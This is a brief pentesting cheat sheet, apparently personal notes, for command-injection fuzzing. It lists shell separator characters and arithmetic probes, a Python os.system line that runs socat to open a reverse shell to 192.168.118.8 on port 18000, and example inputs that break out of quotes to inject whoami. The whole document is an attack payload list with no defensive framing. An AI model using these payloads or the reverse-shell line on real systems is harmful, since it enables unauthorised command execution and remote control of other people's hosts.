#### Fuzzing

```
#Special Characters
;
&
&&
|
||

#Evaluation
1+1
1*1

#Python
os.system('socat TCP:192.168.118.8:18000 EXEC:sh')
```

#### Notes
Remember to try closing off the original query using quotes:

```
Example: data";whoami"
Example: data"&whoami"
```


